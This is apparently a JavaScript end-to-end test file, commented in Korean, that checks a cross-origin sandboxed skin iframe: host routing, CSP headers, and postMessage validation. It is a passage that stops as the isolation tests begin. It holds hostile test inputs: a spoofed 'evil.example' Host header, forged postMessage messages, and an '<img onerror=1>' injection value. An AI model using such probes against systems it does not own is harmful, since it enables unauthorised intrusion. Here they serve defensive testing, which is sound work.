/* =========================================================
   SKIN SANDBOX — E2E (SANDBOX-0 격리 + SANDBOX-1 HOME 렌더)

   기준 문서: IMORY_SANDBOX_SKIN_DESIGN.md §E SANDBOX-0 / §D-4

   무엇을 보는가
   -------------
   "별도 origin의 iframe과 postMessage 왕복이 실제 환경에서
   가능한가"를 실제 브라우저로 판정한다.

     [host]      메인 origin에서 frame.html이 404인가
                 sandbox origin에서 앱이 뜨지 않는가
                 예상하지 않은 Host 헤더가 거부되는가
     [csp]       실제 응답 헤더의 CSP 전문과 nonce
     [flag]      플래그 OFF면 iframe이 아예 생기지 않는가
     [ready]     READY -> ACK 왕복
     [reject]    위조 origin / 다른 source / 알 수 없는 type
     [isolate]   parent DOM · parent localStorage · fetch · supabase 전역
     [mobile]    390px 가로 넘침
     [regress]   메인 origin의 기존 응답이 그대로인가

   SANDBOX-1에서 더해진 것
     [render]    READY -> ACK -> RENDER_HOME -> RENDERED 왕복,
                 native 렌더와 **같은 innerHTML 구조**,
                 HOME의 공개 데이터(제목·프로필·카테고리·최근 글·
                 발췌 카드)가 실제로 프레임에 그려지는가
     [payload]   wire 위의 data에 금지 필드가 하나도 없는가
                 (프레임 realm에서 도착한 값을 직접 읽는다)
     [height]    콘텐츠 길이에 iframe 높이가 따라오는가,
                 프레임 안에 스크롤 막대가 없는가
     [fallback]  renderMode 없음 / origin 없음 / READY timeout
     [home]      **진짜 index.html** 로 공개 HOME 경로를 탄다 —
                 renderMode 없음/플래그 OFF 는 오늘과 같고,
                 sandbox 는 #themeMount 안 cross-origin iframe 이며,
                 프레임이 안 뜨면 같은 스킨을 native 로 그린다
     [package]   Import -> Export -> Import 왕복에서 renderMode 보존,
                 모르는 renderMode는 reason:"render-mode"로 거부

   SANDBOX-5B에서 더해진 것
     [screens]   **문서 전체**에 지금 화면의 sandbox 프레임 하나뿐인가.
                 HOME ↔ CATEGORY/GALLERY/BANNER/HIGHLIGHTS/POST 를
                 오갈 때 옛 자리의 프레임이 가려지는 것이 아니라
                 **없어지는가**(타이머·rAF·저자 JS 가 끝나는가),
                 그리고 돌아왔을 때 다시 뜨는가

   SANDBOX-5A에서 더해진 것
     [authorjs]      저자 JS 가 프레임 안에서 **정확히 한 번** 돌고
                     클릭/파티클/드래그가 실제로 동작하는가,
                     전용 opt-in 이 없으면 0회인가,
                     JS 가 죽어도 HTML/CSS 가 남는가,
                     그리고 탈출(부모 DOM · 부모 localStorage ·
                     top.location · window.open · form · fetch/XHR/
                     WebSocket/EventSource/beacon · 외부 script ·
                     위조 postMessage · 관리자 주소)이 전부 막히는가
     [authorjspages] 공개 다섯 화면에서도 한 번씩 돌고, 화면을
                     오가도 타이머가 쌓이지 않으며,
                     imorySkin.navigate() 가 실제로 화면을 옮기는가

   ★ 두 origin을 어떻게 만드는가
   포트가 다르면 origin이 다르다(같은 localhost라도). 부모는 8957,
   frame은 8958이다. 두 서버 모두 요청을 **배포되는 그 Pages
   Function**(functions/_middleware.js)에 그대로 통과시킨다 —
   호스트 분기와 CSP가 테스트용 복제본이 아니라 실물이어야
   "메인 origin에서 frame.html이 404"가 보안 장치로서 의미가 있다.

   실행
     node skin/sandbox/skin-sandbox-e2e-test.mjs
     node skin/sandbox/skin-sandbox-e2e-test.mjs --browser=webkit
     node skin/sandbox/skin-sandbox-e2e-test.mjs --only=host
     node skin/sandbox/skin-sandbox-e2e-test.mjs --only=render
========================================================== */

import fs from "node:fs";
import path from "node:path";
import http from "node:http";
import os from "node:os";
import { createRequire } from "node:module";
import { fileURLToPath, pathToFileURL } from "node:url";

const HERE = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.resolve(HERE, "..", "..");

const PARENT_PORT = 8957;
const SANDBOX_PORT = 8958;

const PARENT_ORIGIN = `http://localhost:${PARENT_PORT}`;
const SANDBOX_ORIGIN = `http://localhost:${SANDBOX_PORT}`;

const HARNESS_PATH = "/skin/skin-sandbox-test.html";

const args = process.argv.slice(2);
const argOf = (name, fallback) => {
  const hit = args.find(a => a.startsWith(`--${name}=`));
  return hit ? hit.slice(name.length + 3) : fallback;
};
const BROWSER = argOf("browser", "chromium");
const ONLY = argOf("only", "");
const shouldRun = (name) => !ONLY || ONLY === name;

let passed = 0;
let failed = 0;
const failures = [];

function check(name, condition, detail) {
  if (condition) {
    passed++;
    console.log(`  PASS  ${name}${detail ? ` — ${detail}` : ""}`);
  } else {
    failed++;
    failures.push(name);
    console.log(`  FAIL  ${name}${detail ? ` — ${detail}` : ""}`);
  }
}


/* =========================================================
   배포되는 그 함수 그대로
========================================================== */

const middleware = await import(
  pathToFileURL(path.join(ROOT, "functions", "_middleware.js")).href
);


/* =========================================================
   playwright 찾기 — 다른 e2e와 같은 전략
========================================================== */

async function loadPlaywright(browserName) {
  const candidates = [];
  const npxCache = path.join(
    process.env.LOCALAPPDATA || os.homedir(), "npm-cache", "_npx"
  );
  if (fs.existsSync(npxCache)) {
    for (const dir of fs.readdirSync(npxCache)) {
      candidates.push(path.join(npxCache, dir, "node_modules"));
    }
  }
  if (process.env.APPDATA) {
    candidates.push(path.join(process.env.APPDATA, "npm", "node_modules"));
  }
  candidates.push(path.join(ROOT, "node_modules"));
  if (process.env.IMORY_PLAYWRIGHT_MODULES) {
    candidates.push(process.env.IMORY_PLAYWRIGHT_MODULES);
  }

  for (const base of candidates) {
    const entry = path.join(base, "playwright", "package.json");
    if (!fs.existsSync(entry)) continue;
    let mod;
    try {
      mod = createRequire(entry)("playwright");
    } catch {
      continue;
    }
    if (!mod[browserName]) continue;
    try {
      const probe = await mod[browserName].launch();
      await probe.close();
      return mod;
    } catch {
      /* 다음 후보 */
    }
  }

  throw new Error(
    `playwright ${browserName}을(를) 실행할 수 없습니다. ` +
    `\`npx playwright install ${browserName}\`을 먼저 실행하세요.`
  );
}


/* =========================================================
   서버 — 저장소 파일 + 배포와 같은 Pages Function

   env는 배포에서 Cloudflare 대시보드가 주는 값을 흉내낸다.
   로컬에서는 hostname이 같으므로(localhost) 포트까지 포함한
   host로 sandbox origin을 지정한다 — classifyImoryHost()가
   url.host(host:port)를 보는 이유다.
========================================================== */

const FUNCTION_ENV = {
  SANDBOX_SKIN_HOST: `localhost:${SANDBOX_PORT}`,
  SANDBOX_SKIN_PARENT_ORIGINS: PARENT_ORIGIN
};

const MIME = {
  ".html": "text/html; charset=utf-8",
  ".js": "text/javascript; charset=utf-8",
  ".mjs": "text/javascript; charset=utf-8",
  ".css": "text/css; charset=utf-8",
  ".json": "application/json; charset=utf-8",
  ".png": "image/png",
  ".svg": "image/svg+xml"
};


/*
  "같은 origin의 다른 window"를 만들기 위한 테스트 전용 문서.
  공격자가 sandbox origin(또는 메인 origin)에 자기 문서를 하나
  올려 둔 상황을 대신한다 — allowlist 바깥이므로 middleware보다
  먼저 가로챈다(실제 배포에는 이런 문서가 없다).
*/

const PROBE_HTML = `<!DOCTYPE html><html><head><meta charset="utf-8"></head>
<body><script>
  window.parent.postMessage(
    { imory: 1, type: "IMORY_FRAME_READY", seq: 1, payload: { contract: 1 } },
    "${PARENT_ORIGIN}"
  );
<\/script></body></html>`;


/* =========================================================
   staticResponse — Cloudflare Pages의 정적 서빙을 흉내낸다

   ★ HTML URL handling (2026-09-15 배포 실측)
   Pages는 `/foo.html` 요청을 **308로 `/foo`에 리다이렉트**한다:

     GET https://imory.me/admin/index.html -> 308, Location: /admin/

   처음에는 이 테스트 서버가 `.html` 파일을 그대로 200으로 줬고,
   그래서 "frame 문서만 배포에서 404"를 로컬에서 못 잡았다
   (handleSandboxHost가 308을 404로 접고 있었다). 배포 동작을
   흉내내야 그 계열의 버그가 로컬에서 잡힌다.
========================================================== */

function staticResponse(pathname, search) {

  let rel = decodeURIComponent(pathname);


  /*
    /foo/index.html -> 308 /foo/   ·   /foo.html -> 308 /foo
    질의 문자열은 **그대로 옮겨진다** — 실측:
      GET /admin/index.html?cb=1789460368
        -> 308, Location: /admin/?cb=1789460368
    (이걸 빼먹으면 ?sandboxSkin=1 같은 플래그가 리다이렉트에서
     증발해서, 실제로는 나지 않는 실패가 테스트에서만 난다.)
  */

  const query =
    search || "";

  if (rel.endsWith("/index.html")) {
    return new Response(null, {
      status: 308,
      headers: { "Location": rel.slice(0, -"index.html".length) + query }
    });
  }

  if (rel.endsWith(".html")) {
    return new Response(null, {
      status: 308,
      headers: { "Location": rel.slice(0, -".html".length) + query }
    });
  }


  if (rel.endsWith("/")) rel += "index.html";

  /* 확장자 없는 주소로 오면 .html 파일을 찾아 준다(Pages와 같다) */

  if (!path.extname(rel) && fs.existsSync(path.join(ROOT, rel + ".html"))) {
    rel += ".html";
  }

  const abs = path.join(ROOT, rel);

  if (abs.startsWith(ROOT) && fs.existsSync(abs) && fs.statSync(abs).isFile()) {
    return new Response(fs.readFileSync(abs), {
      status: 200,
      headers: {
        "Content-Type": MIME[path.extname(abs)] || "application/octet-stream",
        "Cache-Control": "no-store"
      }
    });
  }

  /* _redirects 의 SPA fallback: /* /index.html 200 */
  const indexHtml = fs.readFileSync(path.join(ROOT, "index.html"));
  return new Response(indexHtml, {
    status: 200,
    headers: {
      "Content-Type": "text/html; charset=utf-8",
      "Cache-Control": "no-cache"
    }
  });
}


function startServer(port) {

  const server = http.createServer(async (req, res) => {

    const host = req.headers.host || `localhost:${port}`;
    const url = new URL(req.url, `http://${host}`);

    if (url.pathname === "/__probe") {
      res.writeHead(200, {
        "Content-Type": "text/html; charset=utf-8",
        "Cache-Control": "no-store"
      });
      res.end(PROBE_HTML);
      return;
    }

    let response;

    try {
      response = await middleware.onRequest({
        request: new Request(url.toString(), { method: req.method }),
        env: FUNCTION_ENV,
        next: async () => staticResponse(url.pathname, url.search)
      });
    } catch (err) {
      res.writeHead(500, { "Content-Type": "text/plain" });
      res.end(String(err && err.stack || err));
      return;
    }

    const headers = {};
    response.headers.forEach((value, key) => { headers[key] = value; });

    const body = Buffer.from(await response.arrayBuffer());
    res.writeHead(response.status, headers);
    res.end(req.method === "HEAD" ? undefined : body);

  });

  return new Promise(resolve => server.listen(port, () => resolve(server)));
}


/* =========================================================
   raw HTTP — Host 헤더를 직접 조작해서 재 본다
========================================================== */

/*
  Pages가 `.html` 주소를 308로 보내므로, 상태만 재는 절에서는
  리다이렉트를 한 번 따라가 준다(브라우저·크롤러가 하는 대로).
  `follow: false`를 주면 리다이렉트 그 자체를 본다.
*/

async function rawRequestFollow(port, pathname, hostHeader, method = "GET") {

  const first =
    await rawRequest(port, pathname, hostHeader, method);

  if (first.status < 300 || first.status >= 400 || !first.headers.location) {
    return first;
  }

  const next =
    await rawRequest(port, first.headers.location, hostHeader, method);

  return { ...next, redirectedFrom: first.status };

}


function rawRequest(port, pathname, hostHeader, method = "GET") {

  return new Promise((resolve, reject) => {

    const req = http.request(
      {
        host: "127.0.0.1",
        port,
        path: pathname,
        method,
        /*
          기본 Host 는 브라우저가 보내는 것과 같게 맞춘다. 127.0.0.1로
          접속하더라도 Host 헤더가 origin 판정의 근거이기 때문이다 —
          Host 헤더를 갈아 끼우는 절이 바로 아래에 있다.
        */
        headers: { Host: hostHeader || `localhost:${port}` }
      },
      (res) => {
        let body = "";
        res.on("data", chunk => { body += chunk; });
        res.on("end", () => resolve({
          status: res.statusCode,
          headers: res.headers,
          body
        }));
      }
    );

    req.on("error", reject);
    req.end();

  });

}


/* =========================================================
   [host] 호스트 분기 — 실제 응답으로 판정
========================================================== */

async function runHost() {

  console.log("\n[host] 호스트 분기 (실제 Pages Function)");

  const frameOnSandbox =
    await rawRequest(SANDBOX_PORT, "/skin/sandbox/frame");

  check("[host] sandbox origin 의 frame 문서가 200",
    frameOnSandbox.status === 200,
    String(frameOnSandbox.status));

  check("[host] 그 응답이 SANDBOX FRAME 문서다",
    frameOnSandbox.body.includes("sandboxFrameRoot"));


  /*
    ★ Pages의 HTML URL handling. `.html` 주소는 308로 정본 주소에
    보내지고, 따라가면 200이 나와야 한다. 배포 1차에서 이 308을
    404로 접는 바람에 프레임만 안 열렸다.
  */

  const frameHtmlOnSandbox =
    await rawRequest(SANDBOX_PORT, "/skin/sandbox/frame.html");

  check("[host] ★ .html 주소는 308로 정본 주소에 보낸다 (404로 접지 않는다)",
    frameHtmlOnSandbox.status === 308 &&
    frameHtmlOnSandbox.headers.location === "/skin/sandbox/frame",
    `${frameHtmlOnSandbox.status} -> ${frameHtmlOnSandbox.headers.location || "(없음)"}`);

  const frameHtmlFollowed =
    await rawRequestFollow(SANDBOX_PORT, "/skin/sandbox/frame.html");

  check("[host] 그 308을 따라가면 프레임 문서가 나온다",
    frameHtmlFollowed.status === 200 &&
    frameHtmlFollowed.body.includes("sandboxFrameRoot"));


  const frameOnMain =
    await rawRequestFollow(PARENT_PORT, "/skin/sandbox/frame.html");

  check("[host] ★ 메인 origin 의 /skin/sandbox/frame.html 이 404",
    frameOnMain.status === 404,
    `${frameOnMain.status} (이 분기가 없으면 SPA fallback 때문에 200 index.html 이다 — 2026-09-15 실측)`);

  const frameCanonicalOnMain =
    await rawRequestFollow(PARENT_PORT, "/skin/sandbox/frame");

  check("[host] ★ 메인 origin 의 확장자 없는 /skin/sandbox/frame 도 404",
    frameCanonicalOnMain.status === 404,
    `${frameCanonicalOnMain.status} — 한쪽만 막으면 그쪽으로 프레임이 부모 origin 에 열린다`);


  const appOnSandbox =
    await rawRequest(SANDBOX_PORT, "/");

  check("[host] ★ sandbox origin 의 / 가 404 (앱이 안 뜬다)",
    appOnSandbox.status === 404,
    String(appOnSandbox.status));

  const indexOnSandbox =
    await rawRequest(SANDBOX_PORT, "/index.html");

  check("[host] ★ sandbox origin 의 /index.html 도 404",
    indexOnSandbox.status === 404,
    String(indexOnSandbox.status));

  const supabaseOnSandbox =
    await rawRequest(SANDBOX_PORT, "/core/lib/supabase-client.js");

  check("[host] ★ sandbox origin 에서 supabase client 를 받을 수 없다",
    supabaseOnSandbox.status === 404,
    String(supabaseOnSandbox.status));

  /*
    ★ SANDBOX-1에서 바뀐 곳. SANDBOX-0에서는 이 경로가 404였다
    (그때는 빈 프레임이라 렌더러가 필요 없었다). 지금은 공개 화면과
    **같은 렌더러**를 프레임 안에서 쓰므로 200이어야 한다.
    대신 바로 아래에서 앱/인증/Studio/다른 skin 파일이 여전히
    404라는 것을 확인한다 — allowlist가 느슨해진 것이 아니라
    정확히 렌더러 사슬만 늘어난 것이다.
  */

  const renderOnSandbox =
    await rawRequest(SANDBOX_PORT, "/skin/skin-render.js");

  check("[host] ★ SANDBOX-1: sandbox origin 에서 렌더러는 200",
    renderOnSandbox.status === 200,
    String(renderOnSandbox.status));

  for (const allowed of [
    "/skin/skin-css-validate.js",
    "/skin/skin-sanitize.js",
    "/core/content-width.js",
    "/core/content-width.css"
  ]) {

    const res = await rawRequest(SANDBOX_PORT, allowed);

    check(`[host] 렌더러가 끌어오는 ${allowed} 도 200`,
      res.status === 200, String(res.status));

  }

  for (const denied of [
    "/skin/skin-home.js",
    "/skin/skin-context.js",
    "/skin/skin-template.js",
    "/skin/skin-link-nav.js",
    "/studio/studio-preview.js",
    "/admin/admin.js",
    "/auth/",
    "/skin/test-skins/imory-sandbox-home-v1.json"
  ]) {

    const res = await rawRequestFollow(SANDBOX_PORT, denied);

    check(`[host] ★ sandbox origin 에서 ${denied} 는 여전히 404`,
      res.status === 404, String(res.status));

  }


  const configOnSandbox =
    await rawRequest(SANDBOX_PORT, "/skin/sandbox/skin-sandbox-config.js");

  check("[host] frame 이 쓰는 스크립트는 sandbox origin 에서 200",
    configOnSandbox.status === 200,
    String(configOnSandbox.status));

  check("[host] 그 자산에 nosniff 가 붙는다",
    (configOnSandbox.headers["x-content-type-options"] || "") === "nosniff");


  const configOnMain =
    await rawRequest(PARENT_PORT, "/skin/sandbox/skin-sandbox-config.js");

  check("[host] 부모(메인 origin)는 같은 스크립트를 계속 받는다",
    configOnMain.status === 200,
    "frame.html 만 막고 디렉터리 전체를 막지 않는다");


  const postToFrame =
    await rawRequest(SANDBOX_PORT, "/skin/sandbox/frame", null, "POST");

  check("[host] sandbox origin 은 GET/HEAD 외 메서드를 거부한다",
    postToFrame.status === 404,
    String(postToFrame.status));


  const unknownHost =
    await rawRequest(PARENT_PORT, "/", "evil.example");

  check("[host] ★ 예상하지 않은 Host 헤더를 거부한다",
    unknownHost.status === 404,
    `Host: evil.example -> ${unknownHost.status}`);

  const unknownSubdomain =
    await rawRequest(PARENT_PORT, "/", "alice--skin.imory.me");

  check("[host] ★ 아직 설정되지 않은 slug 서브도메인도 거부한다",
    unknownSubdomain.status === 404,
    `-> ${unknownSubdomain.status}`);

}


/* =========================================================
   [csp] 실제 응답 헤더
========================================================== */

async function runCsp() {

  console.log("\n[csp] frame 문서의 CSP (실제 응답 헤더)");

  const first =
    await rawRequest(SANDBOX_PORT, "/skin/sandbox/frame");

  const csp =
    first.headers["content-security-policy"] || "";

  console.log("\n  --- CSP 전문 ---");
  csp.split("; ").forEach(d => console.log("    " + d));
  console.log("  ----------------\n");

  const has = (d) => csp.split("; ").indexOf(d) !== -1;

  check("[csp] 헤더가 실제로 붙는다", csp.length > 0);
  check("[csp] default-src 'none'", has("default-src 'none'"));
  check("[csp] connect-src 'none'", has("connect-src 'none'"));
  check("[csp] object-src 'none'", has("object-src 'none'"));
  check("[csp] base-uri 'none'", has("base-uri 'none'"));
  check("[csp] form-action 'none'", has("form-action 'none'"));
  check("[csp] frame-ancestors 가 부모 origin 하나",
    has(`frame-ancestors ${PARENT_ORIGIN}`), csp);
  check("[csp] ★ script-src 에 unsafe-inline / unsafe-eval 이 없다",
    csp.indexOf("unsafe-inline") === -1 && csp.indexOf("unsafe-eval") === -1);

  /*
    ★ SANDBOX-5A. 저자 JS 가 실행되기 시작했지만 CSP 는 넓히지
    않았다 — nonce 가 붙은 inline script 하나로 끝났기 때문이다
    (설계 문서 §O-3). 그 사실을 응답 헤더로 못박는다: 원래 계획이던
    blob: 가 **어디에도 없다**.
  */

  check("[csp] ★ 저자 JS 때문에 blob: 을 열지 않았다",
    csp.indexOf("blob:") === -1 ||
    csp.indexOf("img-src") !== -1 &&
      (csp.split("; ").find(d => d.indexOf("script-src ") === 0) || "")
        .indexOf("blob:") === -1,
    csp.split("; ").find(d => d.indexOf("script-src ") === 0) || "");


  /* =====================================================
     SANDBOX-1에서 넓어진 세 칸. 실제 응답 헤더로 확인한다 —
     buildSandboxCsp()를 다시 부르는 것이 아니라 **배포되는 그
     함수가 실제로 내보낸 헤더**를 본다.
  ====================================================== */

  const scriptSrc =
    csp.split("; ").find(d => d.indexOf("script-src ") === 0) || "";

  check("[csp] ★ script-src 의 바깥 출처는 CSS 파서 파일 하나뿐이다",
    (scriptSrc.match(/https?:\/\//g) || []).length === 1 &&
    scriptSrc.indexOf("@eslint/css-tree@") !== -1 &&
    scriptSrc.endsWith(".js"),
    scriptSrc);

  const imgSrc =
    csp.split("; ").find(d => d.indexOf("img-src ") === 0) || "";

  check("[csp] ★ img-src 가 https: 전체를 열지 않는다",
    imgSrc.indexOf("https:") !== imgSrc.length - "https:".length &&
    !/(^|\s)https:(\s|$)/.test(imgSrc) &&
    imgSrc.indexOf("data:") !== -1,
    imgSrc);

  const fontSrc =
    csp.split("; ").find(d => d.indexOf("font-src ") === 0) || "";

  check("[csp] ★ font-src 도 https: 전체를 열지 않는다",
    !/(^|\s)https:(\s|$)/.test(fontSrc), fontSrc);

  check("[csp] ★ style-src 는 self + nonce (unsafe-inline 아님)",
    /style-src 'self' 'nonce-[A-Za-z0-9_-]+'/.test(csp), csp);

  const nonceMatch =
    csp.match(/'nonce-([A-Za-z0-9_-]+)'/);

  check("[csp] nonce 가 헤더에 있다", Boolean(nonceMatch));

  check("[csp] 같은 nonce 가 문서의 인라인 블록에 들어갔다",
    Boolean(nonceMatch) &&
    first.body.includes(`<script nonce="${nonceMatch[1]}">`) &&
    first.body.includes(`<style nonce="${nonceMatch[1]}">`));

  /*
    import map은 문서에 글자로 적혀 있지 않다 — document.write로
    만들어진다. 그 태그가 nonce를 받는지는 런타임에서만 보인다:
    못 받으면 CSP가 막고, 그러면 정적 import가 ?v= 없이 나가거나
    아예 실패해서 [render] 절이 통째로 실패한다.
  */

  check("[csp] 문서에 importmap 이 글자로 적혀 있지 않다 (런타임 생성)",
    first.body.indexOf("type=\"importmap\"") === -1);

  check("[csp] frame 문서는 캐시되지 않는다 (nonce 가 매번 바뀐다)",
    (first.headers["cache-control"] || "").includes("no-store"),
    first.headers["cache-control"]);

  const second =
    await rawRequest(SANDBOX_PORT, "/skin/sandbox/frame");

  const secondNonce =
    (second.headers["content-security-policy"] || "").match(/'nonce-([A-Za-z0-9_-]+)'/);

  check("[csp] 요청마다 nonce 가 다르다",
    Boolean(secondNonce) && secondNonce[1] !== nonceMatch[1]);

}


/* =========================================================
   브라우저 쪽
========================================================== */

let playwright;

async function openHarness(browser, query, viewport) {

  const ctx = await browser.newContext({
    viewport: viewport || { width: 900, height: 800 }
  });

  const page = await ctx.newPage();

  const consoleErrors = [];
  page.on("console", msg => {
    if (msg.type() === "error") consoleErrors.push(msg.text());
  });

  await page.goto(
    PARENT_ORIGIN + HARNESS_PATH + (query || ""),
    { waitUntil: "load" }
  );

  /* 하네스가 mount 를 끝낼 때까지 */
  await page.waitForFunction(
    () => window.__sandboxHarnessResult !== undefined,
    null,
    { timeout: 15000 }
  );

  return { ctx, page, consoleErrors };

}


const ON_QUERY =
  `?sandboxSkin=1&sandboxSkinOrigin=${encodeURIComponent(SANDBOX_ORIGIN)}`;


/* =========================================================
   [flag] 플래그 OFF — iframe이 아예 생기지 않는다
========================================================== */

async function runFlag(browser) {

  console.log("\n[flag] 기능 플래그");

  const off = await openHarness(browser, "");

  check("[flag] ★ 기본(쿼리 없음)에서 mount 가 폴백한다",
    (await off.page.evaluate(() => window.__sandboxHarnessResult.reason)) === "disabled");

  check("[flag] ★ 문서에 iframe 이 하나도 없다",
    (await off.page.locator("iframe").count()) === 0);

  await off.ctx.close();


  const noOrigin = await openHarness(browser, "?sandboxSkin=1");

  check("[flag] 플래그만 켜고 frame origin 이 없으면 폴백한다",
    (await noOrigin.page.evaluate(() => window.__sandboxHarnessResult.reason)) === "no-origin");

  check("[flag] 그때도 iframe 이 생기지 않는다",
    (await noOrigin.page.locator("iframe").count()) === 0);

  await noOrigin.ctx.close();


  const sameOrigin = await openHarness(
    browser,
    `?sandboxSkin=1&sandboxSkinOrigin=${encodeURIComponent(PARENT_ORIGIN)}`
  );

  check("[flag] ★ frame origin 이 부모와 같으면 만들지 않는다",
    (await sameOrigin.page.evaluate(() => window.__sandboxHarnessResult.reason)) === "no-origin",
    "same-origin + allow-same-origin 조합을 만들지 않는다");

  await sameOrigin.ctx.close();

}


/* =========================================================
   [ready] READY -> ACK 왕복
========================================================== */

async function runReady(browser) {

  console.log("\n[ready] READY -> ACK 왕복");

  const { ctx, page, consoleErrors } = await openHarness(browser, ON_QUERY);

  check("[ready] mount 가 성공했다",
    (await page.evaluate(() => window.__sandboxHarnessResult.ok)) === true,
    await page.evaluate(() => window.__sandboxHarnessResult.reason || ""));

  const iframe = page.locator("iframe.imory-skin-sandbox-frame");

  check("[ready] iframe 이 하나 생겼다",
    (await iframe.count()) === 1);

  check("[ready] ★ sandbox 속성이 allow-scripts allow-same-origin 둘뿐이다",
    (await iframe.getAttribute("sandbox")) === "allow-scripts allow-same-origin",
    String(await iframe.getAttribute("sandbox")));

  const sandboxAttr = (await iframe.getAttribute("sandbox")) || "";

  check("[ready] ★ allow-top-navigation / allow-popups / allow-forms / allow-modals 없음",
    !/allow-top-navigation|allow-popups|allow-forms|allow-modals|allow-downloads/.test(sandboxAttr));

  check("[ready] referrerpolicy=no-referrer",
    (await iframe.getAttribute("referrerpolicy")) === "no-referrer");

  check("[ready] scrolling=no (이중 스크롤 금지)",
    (await iframe.getAttribute("scrolling")) === "no");

  check("[ready] iframe src 가 sandbox origin 이다",
    ((await iframe.getAttribute("src")) || "").startsWith(SANDBOX_ORIGIN),
    String(await iframe.getAttribute("src")));

  check("[ready] iframe src 에 배포 버전이 붙는다",
    ((await iframe.getAttribute("src")) || "").includes("?v="),
    String(await iframe.getAttribute("src")));


  const frame =
    page.frames().find(f => f.url().startsWith(SANDBOX_ORIGIN));

  check("[ready] 프레임 문서가 로드됐다", Boolean(frame));

  /*
    ★ SANDBOX-1에서 바뀐 곳. SANDBOX-0의 프레임은 진단 문구
    ("SANDBOX FRAME READY")를 화면에 찍었다. 이제 그 자리는 스킨이
    그려질 **렌더 컨테이너**라 처음에는 비어 있어야 한다 —
    렌더 전에 사용자에게 보일 문구가 있으면 그것이 스킨 위에
    깜빡인다. 준비 상태는 텍스트가 아니라 속성으로 남긴다.
  */

  await frame.waitForFunction(
    () => document.getElementById("sandboxFrameRoot")
      .getAttribute("data-imory-sandbox-state") !== null,
    null,
    { timeout: 5000 }
  );

  check("[ready] ★ 렌더 컨테이너는 상태 속성으로만 말한다 (문구 없음)",
    ["ready", "rendered"].indexOf(
      await frame.evaluate(
        () => document.getElementById("sandboxFrameRoot")
          .getAttribute("data-imory-sandbox-state")
      )
    ) !== -1);

  check("[ready] 오류 문구는 숨어 있다",
    (await frame.evaluate(
      () => document.getElementById("sandboxFrameNotice")
        .getAttribute("data-visible")
    )) === null);

  await frame.waitForFunction(
    () => document.getElementById("sandboxFrameRoot")
      .getAttribute("data-imory-ack") === "1",
    null,
    { timeout: 5000 }
  );

  check("[ready] ★ ACK 가 프레임에 도착했다 (왕복 성립)", true);

  check("[ready] CSP 위반 콘솔 오류가 없다",
    !consoleErrors.some(t => /Content Security Policy/i.test(t)),
    consoleErrors.filter(t => /Content Security Policy/i.test(t)).join(" | "));

  return { ctx, page, frame };

}


/* =========================================================
   [reject] 검증에 걸리는 메시지들
========================================================== */

async function runReject(browser) {

  console.log("\n[reject] 메시지 거부");

  const { ctx, page, frame } = await runReady(browser);


  /* --- 부모 쪽 --------------------------------------------- */

  await page.evaluate(() => { window.__sandboxHarnessErrors.length = 0; });

  /*
    ① 같은 origin(sandbox origin)의 **다른 window**. 공격자가
       sandbox origin에 문서 하나를 올려 둔 상황을 대신한다.
       origin은 통과하고 source에서 걸려야 한다.
  */

  await page.evaluate((origin) => {
    const probe = document.createElement("iframe");
    probe.id = "probeFrame";
    probe.src = origin + "/__probe";
    document.body.appendChild(probe);
  }, SANDBOX_ORIGIN);

  await page.waitForFunction(
    () => window.__sandboxHarnessErrors.length > 0,
    null,
    { timeout: 5000 }
  ).catch(() => {});

  const afterProbe =
    await page.evaluate(() => window.__sandboxHarnessErrors.slice());

  check("[reject] ★ 같은 origin 이지만 다른 source 는 거부된다",
    afterProbe.includes("bad-source"),
    afterProbe.join(", ") || "(아무 메시지도 안 옴)");


  /* ② 부모 origin(다른 origin)에서 온 READY */

  await page.evaluate(() => { window.__sandboxHarnessErrors.length = 0; });

  await page.evaluate(() => {
    const probe = document.createElement("iframe");
    probe.id = "sameOriginProbe";
    probe.src = "/__probe";
    document.body.appendChild(probe);
  });

  await page.waitForFunction(
    () => window.__sandboxHarnessErrors.length > 0,
    null,
    { timeout: 5000 }
  ).catch(() => {});

  const afterSameOrigin =
    await page.evaluate(() => window.__sandboxHarnessErrors.slice());

  check("[reject] ★ 위조 origin(부모 자신) 의 메시지는 거부된다",
    afterSameOrigin.includes("bad-origin"),
    afterSameOrigin.join(", ") || "(아무 메시지도 안 옴)");


  /* ③ 진짜 프레임이 보낸, 알 수 없는 type */

  await page.evaluate(() => { window.__sandboxHarnessErrors.length = 0; });

  await frame.evaluate((parentOrigin) => {
    window.parent.postMessage(
      { imory: 1, type: "IMORY_EVAL", seq: 2, payload: { contract: 1 } },
      parentOrigin
    );
  }, PARENT_ORIGIN);

  await page.waitForFunction(
    () => window.__sandboxHarnessErrors.length > 0,
    null,
    { timeout: 5000 }
  ).catch(() => {});

  check("[reject] ★ 알 수 없는 message type 은 거부된다",
    (await page.evaluate(() => window.__sandboxHarnessErrors.slice()))
      .includes("unknown-type"));


  /* ④ 진짜 프레임이 보낸, payload 에 모르는 키 */

  await page.evaluate(() => { window.__sandboxHarnessErrors.length = 0; });

  await frame.evaluate((parentOrigin) => {
    window.parent.postMessage(
      {
        imory: 1, type: "IMORY_FRAME_READY", seq: 3,
        payload: { contract: 1, html: "<img onerror=1>" }
      },
      parentOrigin
    );
  }, PARENT_ORIGIN);

  await page.waitForFunction(
    () => window.__sandboxHarnessErrors.length > 0,
    null,
    { timeout: 5000 }
  ).catch(() => {});

  check("[reject] ★ 모르는 payload 키가 있으면 거부된다",
    (await page.evaluate(() => window.__sandboxHarnessErrors.slice()))
      .includes("unknown-payload-key"));


  /* --- 프레임 쪽 ------------------------------------------- */

  const before =
    await frame.evaluate(() => window.__imorySandboxRejected || 0);

  await page.evaluate(() => {
    const f = document.querySelector("iframe.imory-skin-sandbox-frame");
    f.contentWindow.postMessage(
      { imory: 1, type: "IMORY_EVAL", seq: 9, payload: { contract: 1 } },
      new URL(f.src).origin
    );
  });

  await frame.waitForFunction(
    (n) => (window.__imorySandboxRejected || 0) > n,
    before,
    { timeout: 5000 }
  ).catch(() => {});

  check("[reject] 프레임도 알 수 없는 type 을 거부한다",
    (await frame.evaluate(() => window.__imorySandboxLastReason)) === "unknown-type",
    String(await frame.evaluate(() => window.__imorySandboxLastReason)));

  check("[reject] 거부해도 화면이 그대로다 (프로빙 신호 없음)",
    (await frame.evaluate(
      () => document.getElementById("sandboxFrameRoot")
        .getAttribute("data-imory-sandbox-state")
    )) === "rendered" &&
    (await frame.evaluate(
      () => document.getElementById("sandboxFrameNotice")
        .getAttribute("data-visible")
    )) === null);

  await ctx.close();

}


/* =========================================================
   [isolate] 격리 — 프레임이 못 하는 것들
========================================================== */

async function runIsolate(browser) {

